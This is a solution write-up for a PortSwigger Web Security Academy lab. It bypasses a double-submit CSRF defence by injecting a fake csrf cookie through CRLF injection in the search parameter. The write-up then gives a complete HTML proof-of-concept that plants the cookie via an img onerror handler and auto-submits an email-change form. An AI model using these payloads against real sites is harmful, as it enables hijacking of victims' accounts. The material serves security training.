## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6f885b68-d993-4474-a85c-3d5b0242a035)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/416cc06f-6115-4119-a114-2a0eb6df963c)

Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0316099e-9e67-412a-a322-1ca6a63d58f6)

As soon as an adversary is able to set cookie values, the CSRF-protection can be circumvented entirely.The token may or may not require the proper format, so I just try it out with an arbitrary short value:

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e6573443-b960-4bd8-aed1-bbddce52b2c3)

Sure enough, the request goes through and the email is updated.


Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a64109fb-ce37-40f1-85dd-2d71b015e2d2)


Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:

```html
/?search=hii%0d%0aSet-Cookie:%20csrf=test
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9985af61-c9f4-4400-92a3-555108544094)

To create the exploit, I use the CSRF PoC generator of Burp Suite.And remove the auto-submit <script> block and instead add the following code to inject the cookie and submit the form:

```html
 <img src="https://0ae200570418da8783876edf00d50090.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

Final Payloadwill -

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ae200570418da8783876edf00d50090.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="jail&#64;user&#46;net" />
      <input type="hidden" name="csrf" value="anytoken" />
      <input type="submit" value="Submit request" />
    </form>
      <img src="https://0ae200570418da8783876edf00d50090.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

LAB Solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/127c0cdd-5d5a-48ba-bb79-5b7fbaa17713)


